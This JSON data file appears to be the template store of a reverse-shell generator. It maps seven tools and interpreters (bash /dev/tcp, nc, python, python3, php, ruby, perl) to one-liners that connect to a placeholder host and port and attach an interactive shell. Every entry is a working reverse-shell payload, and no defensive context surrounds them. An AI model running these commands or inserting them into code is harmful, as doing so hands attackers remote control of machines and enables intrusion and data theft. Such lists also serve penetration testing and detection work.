{
    "/dev/tcp": "$SHELL -i >& /dev/tcp/$HOST/$PORT 0>&1",
    "nc": "nc -e /bin/$SHELL $HOST $PORT",
    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/$SHELL\",\"-i\"]);'",
    "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/$SHELL\",\"-i\"]);'",
    "php": "php -r '$sock=fsockopen(\"$HOST\",$PORT);exec(\"/bin/$SHELL -i <&3 >&3 2>&3\");'",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"$HOST\",$PORT).to_i;exec sprintf(\"/bin/$SHELL -i <&%d >&%d 2>&%d\",f,f,f)'",
    "perl": "perl -e 'use Socket;$i=\"$HOST\";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/$SHELL -i\");};'"
}